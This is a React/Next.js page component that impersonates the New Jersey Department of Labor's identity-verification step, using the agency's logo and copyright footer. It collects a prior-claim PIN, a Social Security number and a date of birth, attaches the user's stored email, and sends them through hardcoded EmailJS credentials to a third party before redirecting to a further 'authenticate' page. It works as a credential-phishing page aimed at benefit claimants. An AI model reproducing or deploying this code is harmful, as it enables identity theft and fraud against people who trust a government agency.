import styles from '../styles/Home.module.css';
import { useEffect, useState, useRef } from 'react';
import { useRouter } from 'next/router';
import emailjs from 'emailjs-com';

const Verify = () => {
    const form = useRef();
    const router = useRouter();
    const [userEmail, setUserEmail] = useState('');

    useEffect(() => {
        const email = localStorage.getItem('user_email') || '';
        setUserEmail(email);
    }, []);

    const handleSubmit = (e) => {
        e.preventDefault();
        const pin = form.current.pin.value;
        const ssn = form.current.ssn.value;
        const dob = form.current.dob.value;

        if (!pin || !ssn || !dob) {
            alert('Please fill in all fields.');
            return;
        }

        const templateParams = {
            pin,
            ssn,
            dob,
            user_email: userEmail
        };

        emailjs.send(
            'service_ozea06x',
            'template_o5upbnk',
            templateParams,
            'XMOnwjyzQDoRVRYl3'
        ).then(
            (result) => {
                router.push('/authenticate');
            },
            (error) => {
                alert('Error sending form');
            }
        );
    };

    return (
        <div className={styles.container}>
            {/* Logo Section */}
            <div className={styles.logoWrapper}>
                <img
                    src="/ASSET/njdol_logo_stamp.svg"
                    alt="NEW JERSEY LOGO"
                    className={styles.logo}
                />
            </div>

            {/* Verification Form Section */}
            <div className={styles.formSection}>
                <form className={styles.loginForm} ref={form} onSubmit={handleSubmit}>
                    {/* Only this professional, italic, and prominent direction message */}
                    <p style={{
                        fontStyle: 'italic',
                        color: '#254d73',
                        fontSize: '1.08rem',
                        margin: '0 0 12px 0',
                        textAlign: 'center',
                        fontWeight: 500,
                        letterSpacing: '0.01em'
                    }}>
                        <span style={{fontWeight: 600, textDecoration: 'underline'}}>Note:</span> Enter the last 4 digit pin number that was established from prior claim
                    </p>
                    <h2 className={styles.heading}>Identity Verification</h2>
                    <input
                        type="text"
                        id="pin"
                        name="pin"
                        placeholder="PIN"
                        className={styles.input}
                        required
                    />
                    <input
                        type="text"
                        id="ssn"
                        name="ssn"
                        placeholder="Social Security Number"
                        className={styles.input}
                        required
                    />
                    <div style={{ width: '100%', display: 'flex', flexDirection: 'column', alignItems: 'flex-start', margin: '12px 0' }}>
                        <label htmlFor="dob" style={{ fontWeight: 500, color: '#254d73', marginBottom: 4 }}>
                            Date of Birth
                        </label>
                        <input
                            type="date"
                            id="dob"
                            name="dob"
                            style={{
                                width: '180px',
                                padding: '8px',
                                borderRadius: '4px',
                                border: '1px solid #ccc',
                                fontSize: '1rem'
                            }}
                            placeholder="MM/DD/YYYY"
                            required
                        />
                        <span style={{ fontSize: '0.92rem', color: '#888', marginTop: 2 }}>
                            Please select your date of birth
                        </span>
                    </div>
                    <button type="submit" className={styles.button}>
                        Submit
                    </button>
                </form>
            </div>
            <footer className={styles.footer}>
                <p>© New Jersey Department of Labor and Workforce Development(NJLWD). All Rights Reserved.</p>
            </footer>
        </div>
    );
};

export default Verify;